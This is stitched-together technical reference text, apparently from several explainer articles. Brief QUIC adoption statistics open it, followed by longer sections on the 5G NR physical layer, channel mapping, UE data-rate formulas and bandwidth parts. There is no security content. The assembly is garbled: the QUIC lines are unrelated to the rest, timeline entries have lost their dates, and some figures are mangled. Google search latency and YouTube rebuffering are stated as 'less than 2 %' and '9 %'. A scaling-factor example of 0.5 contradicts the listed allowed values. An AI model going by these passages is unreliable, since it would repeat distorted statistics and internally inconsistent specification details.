The Google Chrome browser includes IETF 's QUIC ( v29 ) in addition to Google 's QUIC ( Q050 ) .
However , IETF QUIC 0-RTT is not yet supported .
Google claims that IETF QUIC outperforms HTTP over TLS 1.3 over TCP .
Google 's search latency is less than 2 % .
YouTube rebuffer time is less than 9 % .
Client throughput is up by 3 % ( desktop ) and 7 % ( mobile ) .
Google also notes that QUIC carries a third of Google 's traffic .
Measurements collected by W3Techs show that about 5 % of web servers use QUIC .
This has grown from about 2.8 % in January .
Of all sites that use QUIC , about 80 % use the LiteSpeed server .
IETF draft version 29 of QUIC is widely supported .
Source : Netray 2021 .
Weekly scans at netray.io show that IETF draft version 29 of QUIC is widely supported .
Version 29 was published in June 2020 .
The most recent one is version 34 , published in January 2021 .
Comparing L1 of LTE against 5G. Source : Intel 2018 , slide 14 .
5 G NR PHY is designed to meet the main 5 G use cases , namely eMBB , mMTC and URLLC .
While it 's an evolution of LTE PHY , there are many aspects that are unique to 5 G NR PHY .
The PHY layer sits at the bottom of the 5 G NR protocol stack , interfacing with the MAC sublayer higher up via transport channels .
It provides its services for MAC and is configured by RRC .
PHY supports downlink ( gNB - to - UE ) , uplink ( UE - to - gNB ) and sidelink ( UE - to - UE ) communications .
Some of the main features include a wide spectrum from sub - GHz bands to mmWave bands , an OFDM - based air interface , scalable numerology , deployments from indoor picocells to outdoor macrocells , FDD and TDD support , flexible and self - contained slot structure , modulation up to 256QAM , polar and LDPC codes , Hybrid - ARQ ( HARQ ) , bandwidth parts , CORESETs , beamforming , and massive MIMO .
Could you share some technical details of 5 G NR PHY ?
5 G NR scalable numerology or SCS .
Source : Rohde & Schwarz 2018 .
The 5 G spectrum spans a wide range : FR1 ( 410 - 7125 MHz ) and FR2 / mmWave ( 24250 - 52600 MHz ) .
The UE bandwidth per component carrier is in the range 5 - 100MHz ( FR1 ) and 50 - 400MHz ( FR2 ) .
Higher bandwidth allocations can be achieved with carrier aggregation .
The waveform used in 5 G is OFDM with Cyclic Prefix ( CP ) .
In uplink , an optional transform precoding of DFT spreading is done before sub - carrier mapping .
Sub - Carrier Spacing ( SCS ) is flexible from 15kHz to 120kHz , with higher values applicable in FR2 .
Slot duration is also flexible , from 1ms at 15kHz SCS to 125µs at 120kHz SCS .
SCS 240kHz is only for control .
Cyclic prefix at 60kHz SCS can be normal or extended .
For duplexing , both FDD and TDD are supported in FR1 .
Only TDD is applicable in FR2 .
In TDD , DL / UL split can be dynamically adjusted .
What modulation schemes and channel coding are supported in 5 G NR PHY ?
Modulation schemes and channel coding in 5 G NR PHY .
Source : Adapted from Takeda et al .
2019 , tables 2 and 3 .
Modulation schemes supported are QPSK , 16QAM , 64QAM and 256QAM .
For DFT - s - OFDM in uplink , 5 G NR introduces π/2-BPSK for better power efficiency at lower data rates , necessary for mMTC services .
DFT spreading in uplink helps coverage - limited scenarios .
Channel coding is based on Low Density Parity Check ( LDPC ) code , applied on transport blocks .
A large TB is segmented into multiple equal code blocks and LDPC coding is applied on the code blocks .
The Polar code is used for BCH , DCI and UCI .
In addition , block code is used for UCI .
Which are the main physical radio resources in 5 G NR ?
Illustrating Resource Elements and Resource Block .
Source : ShareTechnote 2021 .
Time and frequency are the two main resources .
Time is organized into OFDM symbols , slots , subframes and frames .
Frequency is organized into sub - carriers as needed for OFDM with SCS determined by numerology .
Unlike LTE , both have flexible configurations due to 5 G 's scalable numerology .
5 G NR defines the following : Resource Element ( RE ) : The smallest unit of resource .
It 's one sub - carrier for one OFDM symbol duration .
Resource Block ( RB ) : 12 consecutive sub - carriers in the frequency domain .
It 's not defined for the time domain .
Common Resource Blocks are numbered from zero for each SCS .
A UE is configured one or more bandwidth parts .
The bandwidth part is a contiguous set of common RBs .
Physical Resource Blocks ( PRBs ) are numbered from zero within the bandwidth part .
Thus , a UE uses PRBs for actual communication .
Resource Grid : A combination of subcarriers and OFDM symbols .
Defined for each numerology , carrier and antenna port .
One set of resource grids is defined for downlink , uplink and sidelink each .
Resource Element Group ( REG ) : One PRB and one symbol .
Control Resource Set ( CORESET ) : Multiple PRBs with 1 , 2 or 3 symbols .
What 's the frame and slot structure in 5 G NR ?
Illustrating frame , subframe and slot at different numerology or SCS .
Source : Takeda et al .
2019 , fig .
1 .
A frame is 10ms .
A subframe is 1ms that 's divided into slots .
Slot duration depends on numerology .
At 15kHz , a subframe has a single slot .
At 30kHz , a subframe has two slots , each slot being 500µs .
Likewise , we have slot durations of 250µs@60kHz , 125µs@120kHz and 62.5µs@240kHz .
A slot has 14 OFDM symbols but only 12 symbols at 60kHz when using extended cyclic prefix .
At higher SCS , symbols and slots are shorter .
5 G also permits mini - slot transmissions of 2 , 4 and 7 symbols .
Because the different numerologies are of the form \(2^µ\ ) , they can coexist .
Regardless of numerology , symbols and slots are time aligned .
Services with different requirements of bandwidth and latency can be multiplexed on the same frequency .
The TDD slot structure is self - contained .
It allows for fast and flexible TDD switching .
DL control , DL data , guard period and UL control are in the same slot .
Thus , DL data and its acknowledgment can happen in the same slot .
This is also possible for UL data .
Symbol allocation to DL or UL can be switched in every slot .
What are the different physical channels used in 5 G NR PHY ?
5 G NR physical channels and control information .
Source : Adapted from ETSI 2021b , sec .
4 .
We note the following physical channels ( with transport channel in parenthesis ) : Downlink : PBCH ( BCH ) , PDSCH ( DL - SCH , PCH ) , PDCCH Uplink : PRACH ( RACH ) , PUSCH ( UL - SCH ) , PUCCH Sidelink : PSBCH ( SL - BCH ) , PSSCH ( SL - SCH ) , PSCCH , PSFCH PDCCH , PUCCH , PSCCH and PSFCH are standalone physical channels , that is , they 're not mapped to transport channels .
PDCCH has Slot Format Indicator ( SFI ) and Downlink Control Information ( DCI ) fields .
The latter informs scheduling for PDSCH and PUSCH .
PUCCH carries Uplink Control Information ( UCI ) .
UCI carries channel reports , HARQ - ACK and scheduling requests .
What are the different signals used in 5 G NR PHY ?
PHY has a few signals for the following purposes : Synchronization , Primary Synchronization Signal ( PSS ) and Secondary Synchronization Signal ( SSS ) .
These are transmitted along with PBCH .
Acquisition and Channel Estimation : Demodulation Reference Signal ( DM - RS ) in downlink and uplink .
Sounding Reference Signal ( SRS ) in uplink when PUCCH and PUSCH are not scheduled .
Positioning : Positioning Reference Signal ( PRS ) in downlink .
SRS in uplink .
Phase Tracking : Phase Tracking Reference Signal ( PT - RS ) for PDSCH and PUSCH .
Helps combat path delay spread and Doppler spread .
Beam Management : Channel State Information Reference Signal ( CSI - RS ) in downlink towards a connected UE .
What are the main functions of 5 G NR PHY ?
PHY model for DL - SCH .
Source : ETSI 2020b , fig .
5.2.1 - 1 .
The main functions include error detection on the transport channel and indication to higher layers ; FEC encoding / decoding of the transport channel ; HARQ soft - combining ; rate matching of the coded transport channel to physical channels ; mapping of the coded transport channel onto physical channels ; power weighting of physical channels ; modulation and demodulation of physical channels ; frequency and time synchronisation ; radio characteristics measurements and indication to higher layers ; MIMO antenna processing ; RF processing .
Consider the PHY model for DL - SCH .
At gNB , Transport Blocks ( TBs ) arrive from MAC on transport channels .
PHY adds CRC to each TB , perhaps involving code block segmentation .
Channel coding and rate matching are performed , including for HARQ retransmissions .
Data modulation is next , followed by mapping of physical resources .
Finally , there 's antenna mapping before transmission .
At UE , the reverse process happens with CRC used for error detection and indication to MAC .
In the figure , blue boxes are configurable by higher layers .
For other channels , some steps may be hardcoded in the specification .
For example , all steps are fixed for BCH ; coding and rate matching are fixed for PCH .
What are the main procedures in 5 G NR PHY ?
The main procedures include Cell search ; Power control ; Uplink synchronisation and Uplink timing control ; Random access related procedures ; HARQ related procedures ; Beam management and CSI related procedures ; Sidelink related procedures ; Channel access procedures .
We describe a few : Cell Search : UE acquires time and frequency synchronization for a cell and detects the cell ID .
UE receives PSS , SSS and PBCH .
Uplink Power Control : For PUSCH , PUCCH , SRS and PRACH transmissions .
When Dual Connectivity ( DC ) is active , UE is configured with maximum power for both MCG and SCG .
Random Access : Of either Type-1 or Type-2 .
It involves preamble transmission on PRACH ( and PUSCH MsgA in Type-2 ) , random access response ( RAR ) reception on PDCCH / PDSCH , PUSCH transmission based on RAR UL grant ( fallback in Type-2 ) , and PDSCH contention resolution .
PDSCH Reception : Typically , first requires decoding DCI from PDCCH .
PUSCH Transmission : Scheduled dynamically by UL grant in DCI or semi - statically by Type-1 or Type-2 grants configured by RRC .
CSI Measurements & Reporting : Periodic , semi - persistent or aperiodic .
Reports are sent on PUCCH or PUSCH and triggered by DCI when applicable .
Which are the main 5 G NR PHY specifications ?
5 G NR PHY specifications .
Source : ETSI 2020a , fig .
2 .
For a high - level overview of 5 G NR PHY , the PHY section of TS 38.300 is worth reading .
This specification gives an overall description of NR and NG - RAN .
A general description of the 5 G NR PHY layer is found in TS 38.201 .
Beginners can start with this document .
For more details on PHY , the following are useful : TS 38.202 : Services and functions provided by PHY , downlink / uplink / sidelink models .
TS 38.211 : Physical channels and modulation , frame structure , PHY resources , modulation mapping , OFDM signal generation , scrambling , modulation , up - conversion , layer mapping , precoding .
TS 38.212 : Multiplexing and channel coding , rate matching , transport channels , control information .
TS 38.213 : Physical layer procedures for control , synchronization procedures , uplink power control , random access procedure , UE procedure for reporting and receiving control information .
TS 38.214 : Physical layer procedures for data , power control , procedures related to physical shared channels .
TS 38.215 : Physical layer measurements , UE and NG - RAN measurement capabilities .
To learn about RF requirements including operating bands , channel bandwidth and transmitter / receiver characteristics , the documents to read are TS 38.101 in two parts ( for FR1 and FR2 ) for the UE , and TS 38.104 for base station .
3GPP approves the first specifications for 5 G , called " early drop " of Release 15 .
First updates to specifications towards Release 16 are published .
Some of the new features are Remote Interference Management ( RIM ) , two - step RACH procedure , NR - based access to unlicensed spectrum , Integrated Access and Backhaul ( IAB ) , V2X , eURLLC , NR positioning , MIMO enhancements , Dynamic Spectrum Sharing ( DSS ) enhancements , Multi - RAT DC / CA , NR - DC and cross - carrier scheduling with different numerologies .
3GPP finalizes Release 16 specifications .
Summary of 5 G NR channels .
Source : Techplayon 2018 .
On the air interface between a UE and a 5 G base station , 5 G New Radio carries information on various physical channels .
These channels carry both User Plane ( UP ) and Control Plane ( CP ) information .
However , the 5 G NR protocol stack has many layers , each layer communicating with its peer at a different level of abstraction .
Higher - layers PDUs are not mapped directly to the physical layer for transmission .
Instead , PDUs at a layer are mapped to channel types that suit that layer 's functionality and abstraction .
Thus , RLC delivers its PDUs to MAC over logical channels ; MAC PDUs to PHY are on transport channels .
Channels help us organize and simplify the design and development of the stack .
Each channel can also be prioritized and optimized differently .
Downlink channels are distinct from uplink channels , though some channel names may be the same .
What are the channel types defined in 5 G ?
Types of channels in 5 G NR .
Source : Keysight Technologies 2019 , slide 47 .
There are three types of channels : Logical Channels : Offered by MAC to RLC .
Control channels carry CP packets .
Traffic channels carry UP packets .
Each logical channel maps to an RLC channel coming from the RLC layer .
Transport Channels : Offered by PHY to MAC .
The MAC layer multiplexes one or more logical channels to a transport channel .
Whereas logical channels describe what is carried out , transport channels describe how it is carried out .
Physical Channels : Channels that carry information on the air interface .
Transport channels map to physical channels .
There are also a few standalone physical channels that do n't carry higher - layer information .
On 5 G NR downlink , what 's the channel mapping ?
5 G NR downlink channel mapping .
Source : Electronics Notes 2021 .
Downlink logical channels include the Broadcast Control Channel ( BCCH ) , Paging Control Channel ( PCCH ) , Common Control Channel ( CCCH ) , Dedicated Control Channel ( DCCH ) and Dedicated Traffic Channel ( DTCH ) .
Downlink transport channels include Broadcast Channel ( BCH ) , Paging Channel ( PCH ) and Downlink Shared Channel ( DL - SCH ) .
Downlink physical channels include Physical Broadcast Channel ( PBCH ) , Physical Downlink Control Channel ( PDCCH ) and Physical Downlink Shared Channel ( PDSCH ) .
In terms of mapping , we note the following : BCCH for Master Information Blocks ( MIBs ) goes on BCH , which goes on PBCH .
BCCH for System Information Blocks ( SIBs ) goes on DL - SCH , which goes on PDSCH .
PBCH is used by UE for cell acquisition , selection and re - selection .
PCCH goes on PCH , which goes on PDSCH .
This is used to page a UE whose cell location is unknown .
CCCH is used by a UE during initial access when there 's no RRC connection yet .
Once a connection is established , DCCH and DTCH become available to the UE .
PDSCH carries a variety of transport channels .
It can be adapted to current link conditions .
PDCCH is used to schedule transmissions on PDSCH and PUSCH .
On 5 G NR uplink , what 's the channel mapping ?
5 G NR uplink channel mapping .
Source : Electronics Notes 2021 .
Uplink logical channels include Common Control Channel ( CCCH ) , Dedicated Control Channel ( DCCH ) and Dedicated Traffic Channel ( DTCH ) .
Uplink transport channels include Random Access Channel ( RACH ) and Uplink Shared Channel ( UL - SCH ) .
Uplink physical channels include Physical Random Access Channel ( PRACH ) , Physical Uplink Control Channel ( PUCCH ) , and Physical Uplink Shared Channel ( PUSCH ) .
In terms of mapping , we note the following : PRACH carries RACH , which has no mapped logical channel .
PRACH is used by UE for initial access to the network .
Random access preambles carried on RACH help overcome message collisions due to multiple UEs transmitting at the same time .
PUSCH carries UL - SCH , which carries CCCH , DCCH and DTCH logical channels .
Like PDSCH in downlink , PUSCH has a flexible configuration that can be adapted to link conditions .
PUCCH carries uplink control information although these could be sent on PUSCH as well .
CCCH , DCCH and DTCH are also present in the downlink .
DTCH is the only one in the user plane .
As an example , we note that RRC signalling messages and NAS messages ( that also go through RRC ) use DCCH .
Application data uses DTCH .
Which are the standalone physical channels ?
By standalone physical channels , we mean channels that do n't map to any transport channel .
Information on these channels is only for exchanging control information at the physical layer .
These help in gathering feedback and quickly adjusting configuration or resource allocation to respond to varying conditions on the air interface .
In the downlink , PDCCH carries Slot Format Indicator ( SFI ) and Downlink Control Information ( DCI ) .
DCI does scheduling for PDSCH and PUSCH .
It carries Transmit Power Control ( TPC ) commands .
DCI comes in many formats and one of them carries SFI to inform the UE which slot format is to be used .
On the uplink , PUCCH carries Uplink Control Information ( UCI ) , although UCI can also go on PUSCH .
UCI carries channel reports , HARQ - ACK and scheduling requests .
Which are the 5 G NR physical signals ?
There are a few physical signals closely associated with the operation of physical channels .
For downlink synchronization , there are the Primary Synchronization Signal ( PSS ) and Secondary Synchronization Signal ( SSS ) .
These are transmitted along with PBCH .
For acquisition and channel estimation , Demodulation Reference Signal ( DM - RS ) is used in both downlink and uplink .
It 's applicable for PBCH , PDCCH , PDSCH , PUCCH and PUSCH .
In the uplink , Sounding Reference Signal ( SRS ) is used for channel estimation when PUCCH and PUSCH are not scheduled .
For downlink positioning , Positioning Reference Signal ( PRS ) is used .
Uplink positioning is based on SRS .
For phase tracking and phase noise compensation for PDSCH and PUSCH , Phase Tracking Reference Signal ( PT - RS ) is used .
This combats path delay spread and Doppler spread via fine time and frequency tracking .
For beam management to a connected UE , Channel State Information Reference Signal ( CSI - RS ) is used in the downlink .
What are the sidelink channels ?
The MAC structure shows sidelink logical and transport channels .
Source : ETSI 2021c , fig .
4.2.2 - 3 .
We commonly talk about downlink ( base station to UE ) and uplink ( UE to base station ) channels .
However , there are also sidelink channels that enable direct device - to - device communications .
This is particular to Vehicle - to - Everything ( V2X ) communications .
Sidelink physical channels include the Physical Sidelink Broadcast Channel ( PSBCH ) , Physical Sidelink Control Channel ( PSCCH ) , Physical Sidelink Shared Channel ( PSSCH ) and Physical Sidelink Feedback Channel ( PSFCH ) .
PSCCH and PSFCH are standalone channels .
PSCCH carries a part of Sidelink Channel Information ( SCI ) , the other part going on PSSCH .
Sidelink Feedback Control Information ( SFCI ) goes on PSFCH .
PSFCH carries HARQ feedback for PSSCH reception .
Transport channels include Sidelink Broadcast Channel ( SL - BCH ) and Sidelink Shared Channel ( SL - SCH ) .
Logical channels include Sidelink Broadcast Control Channel ( SBCCH ) , Sidelink Control Channel ( SCCH ) and Sidelink Traffic Channel ( STCH ) .
Mapping of these are PBCCH / SL - BCH / PSBCH , SCCH / SL - SCH / PSSCH and STCH / SL - SCH / PSSCH .
Sidelink physical signals include DM - RS , CSI - RS , PT - RS , Sidelink Primary Synchronization Signal ( S - PSS ) and Sidelink Secondary Synchronization Signal ( S - SSS ) .
PSCCH is associated with DM - RS .
PSSCH is associated with DM - RS and PT - RS .
What are the differences between 4G / LTE and 5 G NR channels ?
5 G NR channels and their equivalent in 4G / LTE .
Source : Keysight Technologies 2019 , slide 48 .
PBCH - DMRS , PDCCH - DMRS , PUCCH - DMRS , PDSCH - PTRS and PUSCH - PTRS are new in 5 G NR .
CRS , EPDCCH and EPDCCH - DMRS in LTE do n't exist in 5G. Some LTE transmission modes do n't need PDSCH - DMRS since Cell - Specific Reference Signal ( CRS ) fulfils the role .
While DCI on PDCCH is present in 5 G , LTE 's downlink controls CFI on PCFICH and HI on PHICH are absent in 5G. These channels carry HARQ ACK / NACK for PUSCH transmissions since LTE uplink HARQ is synchronous .
These are not needed in 5 G since HARQ is asynchronous in both uplink and downlink , that is , HARQ process number is carried in DCI .
LTE 's downlink logical channels Multicast Control Channel ( MCCH ) and Multicast Traffic Channel ( MTCH ) are absent in 5G. Their associated transport and physical channels MCH and PMCH are also absent .
However , multicast is being standardized in Release 17 and some of these channels may be introduced into 5G. 3GPP publishes Release 15 " early drop " .
3GPP publishes Release 15 " main drop " .
This includes the LTE - based Cellular Vehicle - to - Everything ( C - V2X ) feature , first introduced in Release 14 ( Q1 2017 ) .
3GPP publishes Release 15 " late drop " .
This includes 5 G NR - based C - V2X using sidelink channels .
3GPP publishes Release 16 specifications .
This release introduces dedicated 5 G positioning signals , measurements and procedures .
This includes PRS for downlink and SRS for uplink .
3GPP Release 17 specifications are expected to come out in 2022 .
This release might introduce new channels for multicast .
It will enhance sidelink channels , including sidelink relay capability .
Positioning will also be better .
5 G NR theoretical maximum data rates per layer .
Source : Rohde & Schwarz 2019 .
IMT-2020 specifies the maximum data rate that 5 G is required to offer .
This is 20Gbps ( downlink ) and 10Gbps ( uplink ) .
This is a significant increase compared to IMT - Advanced ( 4G / LTE Release 14 ) that offers 1Gbps ( downlink ) and 50Mbps ( uplink ) .
3GPP gives us a formula to calculate the theoretical peak data rates at Layer 1 .
Knowing that real - world deployments are unlikely to achieve this , IMT-2020 specifies that " user experienced " data rate should be at least 100Mbps ( downlink ) and 50Mbps ( uplink ) .
This value is the 5th percentile value of user throughput that 's based on bits correctly delivered to Layer 3 .
We should also make a distinction between the peak rate , average rate and median rate .
Speed tests reporting only peak data rates can be misleading .
Often , real - world tests will quote average or median rates as well .
How can I calculate the theoretical data rate in 5 G NR for uplink and downlink ?
Formula for calculating UE DL / UL maximum data rate over 5 G NR .
Source : Clarke 2019 , 3:30 .
3GPP specifications TS 38.306 shares a formula for calculating the maximum data rate that a UE can support in downlink and uplink .
The formula takes into account Carrier Aggregation ( CA ) .
The calculation is per component carrier ( CC ) and then added up over \(J\ ) carriers .
Among the constants , \(10^{-6}\ ) gives the final value of Mbps .
\(R_{max}\ ) is 948/1024 .
This is the maximum LDPC coding rate .
The number 12 refers to the number of sub - carriers in a Resource Block ( RB ) .
This is multiplied with \(N^{BW}_{PRB}\ ) , which is the maximum number of RBs that can be allocated to the UE for a given sub - carrier spacing ( SCS ) and bandwidth .
The formula assumes normal cyclic prefix .
The number of layers relates to MIMO layers .
Modulation order \(Q_m\ ) translates symbols to bits .
It takes values of 1/2/4/6/8 for BPSK / QPSK/16QAM/64QAM/256QAM .
We divide bits by symbol time \({T_s}\ ) .
There are 14 OFDM symbols per slot , with 1ms slot time at 15kHz SCS .
At higher SCS , the slot duration proportionally decreases , translating to higher data rates .
Could you explain the scaling factor and overheads in the UE data rate formula ?
Scaling factor examples .
Source : Adapted from 3GPP TSG RAN 2018 .
Scaling factor \(f\ ) can take values 1 , 0.8 , 0.75 and 0.4 .
It relates to MIMO layers and modulation orders that are considered per band combination in the formula .
Consider for example a UE whose Baseband Processing Capability ( BPC ) is 100MHz , 4 layers and 256QAM .
Suppose this UE is configured for two component carriers .
Due to BPC , the UE can support only two layers for each CC , resulting in a scaling factor of 0.5 .
Alternatively , the UE may be configured to use four layers for each CC but a lower modulation order of 64QAM is used instead , resulting in a scaling factor of 0.75 .
The scaling factor is configured via RRC signalling .
Overhead \(OH\ ) ranges from 8 % ( FR1 UL ) to 18 % ( FR2 DL ) .
This is due to PHY signalling , typically including SSB , TRS , PDCCH , DM - RS , PT - RS , CSI - RS , PUCCH and SRS .
We note that downlink mmWave transmissions have the highest overhead .
How do I calculate the data rate for the multi - RAT case ?
For a UE using both E - UTRA and 5 G NR , called Multi - RAT Dual Connectivity ( MR - DC ) , rates are calculated separately for each Radio Access Technology ( RAT ) and then added up .
E - UTRA rate that can be computed using E - UTRA 's Transport Block Size ( TBS ) .
The data rate in Mbps is given by , $ $ 10^{-3}\cdot\sum_{j=1}^J TBS_j$$ This considers \(J\ ) E - UTRA component carriers in the MR - DC band combination .
\(TBS_j\ ) is the maximum number of transport block bits on either DL - SCH or UL - SCH channels transmitted over a 1ms Transmission Time Interval ( TTI ) for the j - th CC .
This factors in the number of MIMO layers used for that CC .
Could you show some sample calculations of 5 G UE data rates ?
Maximum 5 G NR data rates per component carrier .
Source : Devopedia 2021 .
Consider FR1 data rate for a single CC .
Parameters to use are 8 layers , 256QAM ( value 8) , scaling factor 1 and an overhead of 0.14 .
Given 60kHz SCS , the equivalent numerology of µ is 2 .
At the 100MHz bandwidth , the number of RBs is 135 .
The calculated data rate is 4623Mbps .
Instead , if we use 30kHz , at 100MHz we get 273 RBs .
This gives us a slightly higher rate of 4674Mbps .
In FR2 , we are limited to 2 layers but move up to 120kHz SCS at a bandwidth of 400MHz .
Numerology µ is 3 .
We got 264 RBs .
Overhead rises to 0.18 .
The calculated data rate is 4310Mbps .
By trading off MIMO layers against bandwidth , we obtain about the same data rate .
FR2 gives lower latency but suffers from lower transmission range .
Uplink calculations are similar except for the overhead that differs from the downlink .
These calculations are only for a single CC .
5 G NR allows aggregation of up to 16 CCs .
However , the maximum aggregated spectrum is 1GHz .
Moreover , the total rate that a UE can handle would depend on supported UE categories .
For 5 G NR sidelink channels , how can I calculate the theoretical data rate ?
Formula for calculating UE maximum data rate over 5 G NR sidelink .
Source : ETSI 2021a , sec .
4.1.5 .
For 5 G NR sidelink channels , the above formula gives the maximum data rate .
The parameters are almost similar to the case of downlink / uplink data rate calculation , but there are a few differences .
In Release 16 , the sidelink channel is limited to 2 layers of MIMO .
Overhead is 0.23 ( FR1 ) and 0.25 ( FR2 ) .
What online resources are available to calculate 5 G UE data rates ?
5 G Tools for RF Wireless has a useful tool for 5 G NR data rate calculation .
Users can select downlink or uplink , FDD or TDD , number of component carriers , layers , modulation order , LDPC coding rate , scaling factor , SCS and bandwidth .
There 's also a selection of TDD slot formats .
The tool computes and displays all values derived from the above inputs .
An alternative is Clarke 's calculator .
Data rates in LTE evolution .
Source : Sierra Wireless 2017 .
LTE - Advanced Pro Release 14 is finalized .
LTE - Advanced Pro is specified in Release 13 and 14 .
This improves on LTE Release 8 and Release 9 with 10x faster downloads and 3x faster uploads .
With LTE - Advanced Pro offering a 1Gbps downlink data rate , it 's also called Gigabit LTE .
LTE - Advanced Pro is seen as a suitable migration path to full 5 G deployments .
IMT-2020 minimum requirements for data rate and spectral efficiency .
Source : Adapted from ITU - R 2017 .
A report published by ITU - R specifies the minimum requirements for IMT-2020 .
This specifies data rate , spectral efficiency , user plane and control plane latencies , connection density , energy efficiency , reliability and mobility metrics .
For data rate and spectral efficiency , peak and 5th percentile numbers are noted .
In the RAN WG1 meeting , the scaling factor was introduced into the UE downlink / uplink data rate formula .
This clarifies that the formula is for per band combination .
User experienced data rates for downlink and uplink meet IMT-2020 requirements .
Source : Henry et al .
2020 , table 22 .
Researchers at the University of Toronto publish their findings on how well 5 G NR satisfies IMT-2020 requirements .
Based on simulations , they find that user experienced data rates meet IMT-2020 requirements .
Top ten 5 G speeds worldwide .
Source : Fogg 2021 .
Real - world measurements by Opensignal for the period Oct - Dec 2020 show that 5 G networks are delivering average speeds better than 150Mbps ( downlink ) and 20Mbps ( uplink ) .
The User rating is excellent for video , voice and gaming experience .
The Philippines and Thailand have benefited the most from video apps compared to their existing 4 G networks .
It 's expected that as networks deploy 5 G Core , latency will improve , thus leading to an even better experience .
However , 5 G availability experienced by users is still poor , at 30 % in Kuwait , 25 % in South Korea and 20 % in the USA .
Bandwidth part and its relation to cell bandwidth .
Source : Lin et al .
2020 , fig .
1 .
In 4G / LTE , UEs support the maximum possible bandwidth of 20MHz .
In 5 G , transmission can go up to 400MHz per carrier .
It 's impractical to expect every UE to support such a high bandwidth .
Therefore , by design , it 's possible for a 5 G UE to communicate on a bandwidth smaller than the cell 's channel bandwidth .
This smaller portion is what 's called the Bandwidth Part ( BWP ) .
Via RRC signalling , a UE is configured with multiple BWPs , in downlink and uplink .
At the PHY layer , the network dynamically activates a BWP for transmission or reception .
Through such dynamic adaptation , BWPs allow a 5 G system to use radio resources optimally to suit current needs .
In 4 G and 5 G , carrier aggregation is possible , which allows UEs to aggregate bandwidth across carriers .
This article is concerned with only bandwidth parts configured on a single carrier .
What are the benefits of having bandwidth parts in 5 G NR ?
Three BWPs to suit three different services .
Source : Adapted from Khan et al .
2020 .
The Bandwidth Part allows us to design chipsets and UEs with a lower bandwidth capability .
Mandating an UE to always use a high bandwidth also leads to higher energy usage .
Compare 20MHz of LTE versus 100MHz ( FR1 ) of 5G. Apart from the higher bandwidth , 5 G 's higher sub - carrier spacing translates to lower symbol duration , higher clock speeds and therefore higher power consumption .
In the FR2 mmWave spectrum , power consumption increases further due to antenna arrays and other RF components .
At lower data rates , 5 G at 100MHz has a lower power efficiency compared to 4G. The use of BWPs overcomes this .
Allocating a single bandwidth to a UE is also not the best use of radio resources .
The bandwidth part allows for dynamic adaptation .
For example , consider three service requirements : eMBB/100Mbps/1ms , eMBB/15Mbps/0.5ms , URLLC/7Mbps/0.25ms .
To meet these , a UE is configured with three BWPs , each with a different numerology , MIMO configuration , modulation , and so on .
For example , B1 has more resource blocks and bandwidth to achieve 100Mbps ; B3 has smaller bandwidth but gives lower latency due to a higher numerology .
What are some allocation scenarios for BWPs ?
Different BWP allocation scenarios .
Source : MediaTek 2018 .
A BWP is a contiguous set of Resource Blocks ( RBs ) .
It starts at a common RB and spans a specified number of RBs .
Numerology , which determines sub - carrier spacing and cyclic prefixes , is also an essential BWP configuration .
Some allocation scenarios are illustrated in the figure .
In the simplest case of ( a ) , a reduced BWP is configured for a UE of a lower bandwidth capability .
Scenario ( b ) is useful for a UE having bursty traffic .
When more data is to be sent , BWP2 is used .
Note that even if BWP1 and BWP2 overlap , only one of them is active at a time .
Scenario ( c ) shows two BWPs with different numerology , each meeting different service requirements .
While Physical Resource Blocks ( PRBs ) of a BWP are all contiguous , there 's no requirement that two BWPs have to be contiguous .
This is apparent in scenario ( d ) where other services can be introduced between BWP1 and BWP2 , although this option is not part of Release 15 .
What are some technical details about BWP ?
A UE is configured with multiple BWPs but only one is active at a time .
Source : Swamy 2019 .
A UE can be configured with a maximum of four BWPs in downlink and another four in uplink .
This is in addition to the initial BWPs configured via SIB1 .
Like UL , there 's also Supplementary Uplink ( SUL ) .
UE can have four BWPs in SUL .
Even with multiple configured BWPs , only one is active at any one time ; that is , UE transmits and receives within its active BWP and nowhere else .
DL PDSCH / PDCCH / CSI - RS are received only within the active DL BWP but UE can use measurement gaps to perform measurements outside the active BWP .
UL PUSCH / PUCCH are sent by UE only with the active UL BWP .
BWP switching means deactivating the currently active BWP and activating another configured BWP .
In TDD , DL and UL BWPs differ only by the transmission bandwidth and numerology ; and they 're switched together .
There 's also a default BWP configured for DL and UL .
If not configured , initial BWP is used as default .
Default is used when there 's not much to send / receive to / from the UE .
It 's activated when an inactivity timer expires .
How does a UE use BWP in RRC idle mode and RRC connected mode ?
Illustrating BWP usage in RRC idle mode and connected mode .
Source : Lin et al .
2020 , fig .
2 .
A UE 's access to the network starts with acquiring the Synchronization Signal Block ( SSB ) that consists of PSS , SSS and PBCH .
This spans 4 OFDM symbols and 20 RBs .
It contains MIB .
MIB contains CORESET#0 configuration .
This is used by UE to infer the initial DL BWP .
UE receives and decodes CORESET#0 , which includes SIB1 .
SIB1 sets the initial BWP for both DL and UL .
The initial BWP is named BWP#0 .
DL BWP#0 is configured such that it encompasses CORESET#0 .
RACH access happens with UL BWP#0 .
The network responds with DL BWP#0 until RRC connection happens .
Once an RRC connection happens , UE can be configured with UE - specific BWPs .
The figure shows BWP#0 ( 24 RBs ) , BWP#1 ( 270 RBs ) and default DL BWP#2 ( 52 RBs ) .
This is an FDD example : DL switches to BWP#2 but UL stays at BWP#1 .
In TDD , BWP switching happens for both DL and UL .
How does BWP adaptation or switching happen ?
DCI - based bandwidth part switching .
Source : Lin et al .
2020 , table 1 .
When a UE moves from idle mode to RRC connected mode , RRC signalling can configure UE - specific BWPs .
An RRC configuration or reconfiguration message may specify one of these to be activated .
If so , the UE will do BWP switching .
Due to RRC processing delay , this can be in the order of tens of milliseconds .
Once UE is configured with multiple BWPs , the network can command UE to switch to BWP using Downlink Control Information ( DCI ) in PDCCH .
DCI format 1_1 for downlink assignment and format 0_1 for uplink grant are used .
These formats contain a BWP indicator that can take 1 or 2 bits .
If more than 2 BWPs are configured , a 2-bit indicator is used .
The third way of switching is when the BWP inactivity timer expires , which triggers a switch to default BWP .
The timer ranges from 2 - 2560ms .
Its maximum value relates to the DRX inactivity timer .
What 's CORESET and how is it relevant to BWP ?
A CORESET lies within a BWP .
Source : Saini 2019 .
The Control Resource Set ( CORESET ) is where the UE searches for downlink control signals .
Like BWP , it 's smaller than the carrier bandwidth .
A CORESET can be anywhere but a UE is expected to process only CORESETs that are within its active BWPs .
CORESETs are configured at the cell level so that the configuration can be reused for any applicable BWP .
CORESET is where UE searches for PDCCH , though the network does n't necessarily transmit PDCCH on every CORESET .
Whereas in LTE , the control region spans the entire carrier bandwidth , 5 G NR optimizes this via CORESET .
LTE control regions can vary and are specified by PCFICH .
In 5 G NR , CORESET size is configured via RRC signalling .
